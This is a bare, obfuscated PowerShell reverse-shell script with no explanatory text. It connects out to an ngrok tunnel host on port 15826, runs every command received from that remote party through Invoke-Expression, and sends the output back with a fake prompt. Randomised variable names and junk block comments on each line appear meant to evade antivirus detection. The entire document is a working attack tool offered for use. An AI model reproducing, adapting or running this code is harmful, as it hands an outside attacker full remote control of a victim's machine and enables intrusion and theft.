$oaoSYLhLJlzpwshWLwKlLnSANgPLESstIMQrMluzNfzhHyd = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",15826)<#fTPfXaAKDWTDRkJqzdmhaiEMgjxewpbDxITmzDAOzXaxZEMg#>
$OzLihDWZDvYswzRbNEXjSTZongvHHZfnOjTrvElnCrhqSKK = $oaoSYLhLJlzpwshWLwKlLnSANgPLESstIMQrMluzNfzhHyd.GetStream()<#nCVVfXijCcpKTBSTRFCoCEeRgEoRQAEjCkcWNIxVTWUKFkKd#>
[byte[]]$eIfJLkgxmLGOzmdDosPTTrKpSrhRADSipQcbemDFVtBJHzF = 0..65535|%{0}<#VaMrdNOUtGtFjwVqSYTApeAWyFzKiZIRMbfKZzgDEGtrpZfe#>
while(($WrnZWDtTyUXfimgbNkXXZEujgyvgTBrSzmcBVMqtQkYDFYY = $OzLihDWZDvYswzRbNEXjSTZongvHHZfnOjTrvElnCrhqSKK.Read($eIfJLkgxmLGOzmdDosPTTrKpSrhRADSipQcbemDFVtBJHzF, 0, $eIfJLkgxmLGOzmdDosPTTrKpSrhRADSipQcbemDFVtBJHzF.Length)) -ne 0){<#SDqczWzPziqLtwCgmzbqJtxXajpzfaWeOjrNPMerUYVRtTjQ#>
$OAetmSoxgZeDrWvhqUvXhvrdOczejioIdzIBWzhBwhUxfAa = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($eIfJLkgxmLGOzmdDosPTTrKpSrhRADSipQcbemDFVtBJHzF,0, $WrnZWDtTyUXfimgbNkXXZEujgyvgTBrSzmcBVMqtQkYDFYY)<#TxFUfVCejCOTbVwUOBvwnfJHcTCGBzqtgCbyvJrhZMfrVxRd#>
$PooOnsUudNZcZVMdbUZHLXxxdXPkeUcuIIbGdhXtgrBjIwc = (iex $OAetmSoxgZeDrWvhqUvXhvrdOczejioIdzIBWzhBwhUxfAa 2>&1 | Out-String )<#IWjIJKxoWsPwWelSGvORuvogBeEitpqQOMTdnYJparGCaoEa#>
$ILvDhIYHGMgQWsPTxnjaTciufiSPJdAEDUfMjHdKtognWWL  = $PooOnsUudNZcZVMdbUZHLXxxdXPkeUcuIIbGdhXtgrBjIwc + "PS " + (pwd).Path + "> "<#xRFsRJggfQWoENrtbXtiGdrLDBdVGglbEDnSQBBiNgWxLoAH#>
$DqkEhaSAZNxAVlBFOLqBXEXnzHnAkuiUHbMCqaVevpsSOhC = ([text.encoding]::ASCII).GetBytes($ILvDhIYHGMgQWsPTxnjaTciufiSPJdAEDUfMjHdKtognWWL)<#HHWdaplplUFYcGLPDHdMeRGlKtFwTVhXIgXzfzcHZXdAWxzJ#>
$OzLihDWZDvYswzRbNEXjSTZongvHHZfnOjTrvElnCrhqSKK.Write($DqkEhaSAZNxAVlBFOLqBXEXnzHnAkuiUHbMCqaVevpsSOhC,0,$DqkEhaSAZNxAVlBFOLqBXEXnzHnAkuiUHbMCqaVevpsSOhC.Length)<#DbaqwNFerqZrFuPGkHyejpHDZUpyGxsbbhSbbWhbCqCXcBXA#>
$OzLihDWZDvYswzRbNEXjSTZongvHHZfnOjTrvElnCrhqSKK.Flush()}<#CEsMzKeWgQHGFTNDUqXTeraybeSOCRTEfVHLLTDHUvmlyRef#>
$oaoSYLhLJlzpwshWLwKlLnSANgPLESstIMQrMluzNfzhHyd.Close()<#vapIdGEPtNKOpRHmXcAUtzHlNnsOuLjSUSMjGboCAmAcwBfh#>
<#NXuIYwVhNFVRSaxULFcwqhVkwgSkcsmVAjDMoECtYdyDwccI#>
